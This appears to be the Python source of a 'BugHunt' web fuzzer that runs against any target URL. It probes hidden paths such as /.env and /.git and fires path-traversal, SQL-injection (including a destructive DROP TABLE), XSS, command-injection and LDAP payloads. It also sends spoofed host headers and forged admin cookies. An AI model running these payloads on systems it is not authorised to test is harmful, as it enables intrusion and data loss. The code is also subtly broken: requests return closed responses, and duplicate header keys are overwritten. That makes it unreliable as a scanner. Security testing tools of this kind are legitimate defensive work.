"""
Advanced web application fuzzing module for BugHunt.
Implements intelligent fuzzing techniques for discovering vulnerabilities.
"""

import asyncio
import aiohttp
import random
import string
import itertools
from typing import Dict, List, Optional, Set
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import logging
from datetime import datetime
import re
import json


class WebFuzzer:
    """Advanced web application fuzzer."""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.logger = logging.getLogger(__name__)
        self.discovered_endpoints = set()
        self.discovered_parameters = set()
        self.fuzzing_results = []
        
        # Fuzzing payloads
        self.fuzz_payloads = {
            'path_traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd',
                '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
            ],
            'sql_injection': [
                "' OR '1'='1",
                "' OR 1=1--",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL, username, password FROM users--",
                "' OR 'x'='x",
                "1' OR '1'='1' --",
                "admin'--",
                "admin'/*",
                "' OR 1=1#",
                "' OR '1'='1'/*"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "&& whoami",
                "; ping -c 1 127.0.0.1",
                "| ping -c 1 127.0.0.1"
            ],
            'ldap_injection': [
                "*",
                "*)(uid=*",
                "*)(|(uid=*",
                "*))(|(uid=*",
                "*))(|(objectClass=*",
                "*)(objectClass=*",
                "*)(|(objectClass=*",
                "*))(|(objectClass=*"
            ]
        }
        
        # Common parameter names to fuzz
        self.parameter_names = [
            'id', 'user', 'username', 'password', 'email', 'name', 'search', 'query', 'q',
            'file', 'path', 'page', 'include', 'doc', 'document', 'cmd', 'command', 'exec',
            'system', 'ping', 'host', 'url', 'link', 'redirect', 'next', 'callback',
            'filter', 'sort', 'order', 'limit', 'offset', 'count', 'size', 'type',
            'action', 'method', 'func', 'function', 'api', 'key', 'token', 'auth',
            'login', 'logout', 'register', 'signup', 'signin', 'admin', 'user_id',
            'session', 'cookie', 'csrf', 'nonce', 'salt', 'hash', 'md5', 'sha1'
        ]
        
        # Common endpoint patterns to discover
        self.endpoint_patterns = [
            '/admin', '/login', '/logout', '/register', '/signup', '/signin',
            '/dashboard', '/panel', '/control', '/manage', '/config', '/settings',
            '/api', '/api/v1', '/api/v2', '/rest', '/graphql', '/soap',
            '/upload', '/download', '/files', '/images', '/media', '/assets',
            '/backup', '/backups', '/old', '/test', '/dev', '/staging', '/demo',
            '/phpinfo.php', '/info.php', '/test.php', '/debug.php', '/status.php',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml', '/clientaccesspolicy.xml',
            '/.git', '/.svn', '/.env', '/config.php', '/database.php', '/db.php',
            '/wp-admin', '/wp-content', '/wp-includes', '/administrator',
            '/cgi-bin', '/bin', '/sbin', '/usr', '/var', '/tmp', '/temp'
        ]
        
    async def __aenter__(self):
        """Async context manager entry."""
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        )
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        if self.session:
            await self.session.close()
            
    async def run_fuzzing(self) -> List[Dict]:
        """Run comprehensive fuzzing tests."""
        print("🔍 Starting web application fuzzing...")
        
        try:
            # Phase 1: Endpoint discovery
            await self._discover_endpoints()
            
            # Phase 2: Parameter discovery
            await self._discover_parameters()
            
            # Phase 3: Payload fuzzing
            await self._fuzz_payloads()
            
            # Phase 4: Advanced fuzzing techniques
            await self._advanced_fuzzing()
            
        except Exception as e:
            self.logger.error(f"Fuzzing error: {str(e)}")
            
        return self.fuzzing_results
        
    async def _discover_endpoints(self):
        """Discover hidden endpoints and directories."""
        print("📁 Discovering endpoints...")
        
        # Combine base URL with common endpoint patterns
        base_url = self.target_url.rstrip('/')
        
        for pattern in self.endpoint_patterns:
            test_url = base_url + pattern
            
            try:
                response = await self._make_request(test_url)
                if response:
                    status = response.status
                    content_length = len(await response.text())
                    
                    # Check for interesting responses
                    if status in [200, 301, 302, 403, 401]:
                        self.discovered_endpoints.add(test_url)
                        
                        if status == 403:
                            self.fuzzing_results.append({
                                'type': 'Directory/File Discovery',
                                'severity': 'Low',
                                'url': test_url,
                                'status': status,
                                'description': f'Accessible directory/file found: {pattern}',
                                'confidence': 'High'
                            })
                        elif status == 401:
                            self.fuzzing_results.append({
                                'type': 'Authentication Required',
                                'severity': 'Medium',
                                'url': test_url,
                                'status': status,
                                'description': f'Protected resource found: {pattern}',
                                'confidence': 'High'
                            })
                            
            except Exception as e:
                self.logger.debug(f"Endpoint discovery error for {test_url}: {str(e)}")
                
    async def _discover_parameters(self):
        """Discover hidden parameters."""
        print("🔧 Discovering parameters...")
        
        # Test common parameter names
        for param in self.parameter_names:
            test_url = f"{self.target_url}?{param}=test"
            
            try:
                response = await self._make_request(test_url)
                if response:
                    content = await response.text()
                    
                    # Check if parameter affects response
                    baseline_response = await self._make_request(self.target_url)
                    if baseline_response:
                        baseline_content = await baseline_response.text()
                        
                        if content != baseline_content:
                            self.discovered_parameters.add(param)
                            self.fuzzing_results.append({
                                'type': 'Parameter Discovery',
                                'severity': 'Low',
                                'parameter': param,
                                'url': test_url,
                                'description': f'Active parameter discovered: {param}',
                                'confidence': 'Medium'
                            })
                            
            except Exception as e:
                self.logger.debug(f"Parameter discovery error for {param}: {str(e)}")
                
    async def _fuzz_payloads(self):
        """Fuzz discovered parameters with various payloads."""
        print("💥 Fuzzing with payloads...")
        
        # Get base parameters from URL
        parsed_url = urlparse(self.target_url)
        base_params = parse_qs(parsed_url.query)
        
        # Combine discovered parameters with base parameters
        all_params = set(self.discovered_parameters)
        all_params.update(base_params.keys())
        
        # Fuzz each parameter with each payload type
        for param in all_params:
            for payload_type, payloads in self.fuzz_payloads.items():
                for payload in payloads[:3]:  # Limit to first 3 payloads per type
                    try:
                        # Test GET parameter
                        test_params = {param: payload}
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params)}"
                        
                        response = await self._make_request(test_url)
                        if response:
                            await self._analyze_response(response, param, payload, payload_type, 'GET')
                            
                        # Test POST parameter
                        response = await self._make_request(
                            self.target_url,
                            method='POST',
                            data={param: payload}
                        )
                        if response:
                            await self._analyze_response(response, param, payload, payload_type, 'POST')
                            
                    except Exception as e:
                        self.logger.debug(f"Payload fuzzing error: {str(e)}")
                        
    async def _advanced_fuzzing(self):
        """Run advanced fuzzing techniques."""
        print("🎯 Running advanced fuzzing techniques...")
        
        # HTTP Method fuzzing
        await self._fuzz_http_methods()
        
        # Header fuzzing
        await self._fuzz_headers()
        
        # Content-Type fuzzing
        await self._fuzz_content_types()
        
        # Cookie fuzzing
        await self._fuzz_cookies()
        
    async def _fuzz_http_methods(self):
        """Fuzz with different HTTP methods."""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
        
        for method in methods:
            try:
                response = await self._make_request(self.target_url, method=method)
                if response:
                    status = response.status
                    
                    # Check for interesting responses
                    if status in [405, 501]:  # Method not allowed/implemented
                        self.fuzzing_results.append({
                            'type': 'HTTP Method Discovery',
                            'severity': 'Low',
                            'method': method,
                            'status': status,
                            'description': f'HTTP method {method} not allowed',
                            'confidence': 'High'
                        })
                    elif status == 200 and method not in ['GET', 'POST']:
                        self.fuzzing_results.append({
                            'type': 'HTTP Method Discovery',
                            'severity': 'Medium',
                            'method': method,
                            'status': status,
                            'description': f'Unexpected HTTP method {method} accepted',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.debug(f"HTTP method fuzzing error for {method}: {str(e)}")
                
    async def _fuzz_headers(self):
        """Fuzz with different headers."""
        headers_to_test = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Host': 'localhost',
            'X-Forwarded-Host': 'localhost',
            'X-Forwarded-Server': 'localhost',
            'X-HTTP-Host-Override': 'localhost',
            'X-Original-URL': '/admin',
            'X-Rewrite-URL': '/admin',
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Ssl': 'on',
            'X-Url-Scheme': 'https',
            'X-Forwarded-Port': '443',
            'X-Forwarded-Host': 'evil.com',
            'X-Host': 'evil.com',
            'X-Forwarded-Server': 'evil.com'
        }
        
        for header, value in headers_to_test.items():
            try:
                response = await self._make_request(
                    self.target_url,
                    headers={header: value}
                )
                
                if response:
                    content = await response.text()
                    
                    # Check for header injection or manipulation
                    if value in content or header.lower() in content.lower():
                        self.fuzzing_results.append({
                            'type': 'Header Manipulation',
                            'severity': 'Medium',
                            'header': header,
                            'value': value,
                            'description': f'Potential header manipulation via {header}',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.debug(f"Header fuzzing error for {header}: {str(e)}")
                
    async def _fuzz_content_types(self):
        """Fuzz with different content types."""
        content_types = [
            'application/json',
            'application/xml',
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'text/plain',
            'application/octet-stream',
            'application/x-javascript',
            'text/html',
            'application/x-httpd-php',
            'application/x-php'
        ]
        
        test_data = {'test': 'value'}
        
        for content_type in content_types:
            try:
                if content_type == 'application/json':
                    data = json.dumps(test_data)
                elif content_type == 'application/xml':
                    data = f'<test>{test_data["test"]}</test>'
                else:
                    data = 'test=value'
                    
                response = await self._make_request(
                    self.target_url,
                    method='POST',
                    data=data,
                    headers={'Content-Type': content_type}
                )
                
                if response:
                    status = response.status
                    
                    # Check for interesting responses
                    if status == 200:
                        self.fuzzing_results.append({
                            'type': 'Content-Type Fuzzing',
                            'severity': 'Low',
                            'content_type': content_type,
                            'description': f'Content-Type {content_type} accepted',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.debug(f"Content-Type fuzzing error for {content_type}: {str(e)}")
                
    async def _fuzz_cookies(self):
        """Fuzz with different cookies."""
        cookies_to_test = {
            'admin': 'true',
            'user': 'admin',
            'role': 'admin',
            'authenticated': 'true',
            'logged_in': 'true',
            'session_id': 'admin',
            'user_id': '1',
            'admin_id': '1',
            'is_admin': 'true',
            'privilege': 'admin'
        }
        
        for cookie_name, cookie_value in cookies_to_test.items():
            try:
                response = await self._make_request(
                    self.target_url,
                    headers={'Cookie': f'{cookie_name}={cookie_value}'}
                )
                
                if response:
                    content = await response.text()
                    
                    # Check for privilege escalation
                    if 'admin' in content.lower() or 'dashboard' in content.lower():
                        self.fuzzing_results.append({
                            'type': 'Cookie Manipulation',
                            'severity': 'High',
                            'cookie': f'{cookie_name}={cookie_value}',
                            'description': f'Potential privilege escalation via cookie {cookie_name}',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.debug(f"Cookie fuzzing error for {cookie_name}: {str(e)}")
                
    async def _analyze_response(self, response, param: str, payload: str, payload_type: str, method: str):
        """Analyze response for vulnerability indicators."""
        try:
            content = await response.text()
            status = response.status
            
            # Analyze based on payload type
            if payload_type == 'sql_injection' and self._detect_sql_error(content):
                self.fuzzing_results.append({
                    'type': 'SQL Injection',
                    'severity': 'Critical',
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'description': f'SQL injection detected in parameter: {param}',
                    'confidence': 'High'
                })
                
            elif payload_type == 'xss' and self._detect_xss_reflection(content, payload):
                self.fuzzing_results.append({
                    'type': 'Cross-Site Scripting (XSS)',
                    'severity': 'High',
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'description': f'XSS vulnerability detected in parameter: {param}',
                    'confidence': 'Medium'
                })
                
            elif payload_type == 'path_traversal' and self._detect_file_content(content):
                self.fuzzing_results.append({
                    'type': 'Directory Traversal',
                    'severity': 'High',
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'description': f'Directory traversal vulnerability detected',
                    'confidence': 'High'
                })
                
            elif payload_type == 'command_injection' and self._detect_command_execution(content):
                self.fuzzing_results.append({
                    'type': 'Command Injection',
                    'severity': 'Critical',
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'description': f'Command injection detected in parameter: {param}',
                    'confidence': 'High'
                })
                
            elif payload_type == 'ldap_injection' and self._detect_ldap_error(content):
                self.fuzzing_results.append({
                    'type': 'LDAP Injection',
                    'severity': 'High',
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'description': f'LDAP injection detected in parameter: {param}',
                    'confidence': 'Medium'
                })
                
            # Check for error responses that might indicate vulnerabilities
            elif status >= 500:
                self.fuzzing_results.append({
                    'type': 'Error Response',
                    'severity': 'Medium',
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'status': status,
                    'description': f'Server error response to {payload_type} payload',
                    'confidence': 'Low'
                })
                
        except Exception as e:
            self.logger.error(f"Response analysis error: {str(e)}")
            
    async def _make_request(self, url: str, method: str = 'GET', **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Make HTTP request with error handling."""
        try:
            async with self.session.request(method, url, **kwargs) as response:
                return response
        except Exception as e:
            self.logger.debug(f"Request failed for {url}: {str(e)}")
            return None
            
    def _detect_sql_error(self, content: str) -> bool:
        """Detect SQL error messages in response content."""
        sql_errors = [
            'mysql_fetch_array', 'mysql_fetch_assoc', 'mysql_fetch_row',
            'mysql_num_rows', 'mysql_query', 'ORA-01756',
            'Microsoft OLE DB Provider for SQL Server',
            'Microsoft JET Database Engine', 'SQLServer JDBC Driver',
            'PostgreSQL query failed', 'Warning: mysql_',
            'valid MySQL result', 'MySqlClient.', 'Npgsql.',
            'Warning: pg_', 'valid PostgreSQL result',
            'Warning: ibase_', 'valid Sybase result',
            'Sybase message', 'Sybase error', 'Sybase: Server message',
            'Microsoft OLE DB Provider for ODBC Drivers',
            'Microsoft OLE DB Provider for Oracle',
            'Microsoft VBScript runtime error',
            'ODBC SQL Server Driver', 'ODBC Microsoft Access',
            'Oracle error', 'Oracle driver', 'Oracle ODBC',
            'Oracle OLE', 'Oracle provider', 'Oracle ODBC Driver',
            'Oracle OLE DB', 'Oracle provider for OLE DB'
        ]
        
        content_lower = content.lower()
        return any(error.lower() in content_lower for error in sql_errors)
        
    def _detect_xss_reflection(self, content: str, payload: str) -> bool:
        """Detect XSS payload reflection in response."""
        return payload in content
        
    def _detect_file_content(self, content: str) -> bool:
        """Detect file system content in response."""
        file_indicators = [
            'root:x:0:0:', '[boot loader]', 'Microsoft Windows',
            '/bin/bash', 'localhost', '127.0.0.1'
        ]
        
        return any(indicator in content for indicator in file_indicators)
        
    def _detect_command_execution(self, content: str) -> bool:
        """Detect command execution in response."""
        cmd_indicators = [
            'uid=', 'gid=', 'groups=', 'total ', 'drwx',
            'Volume Serial Number', 'Directory of', 'Volume in drive'
        ]
        
        return any(indicator in content for indicator in cmd_indicators)
        
    def _detect_ldap_error(self, content: str) -> bool:
        """Detect LDAP error messages."""
        ldap_errors = [
            'ldap_bind', 'Invalid DN syntax', 'LDAP error',
            'ldap_search', 'ldap_connect'
        ]
        
        content_lower = content.lower()
        return any(error.lower() in content_lower for error in ldap_errors)
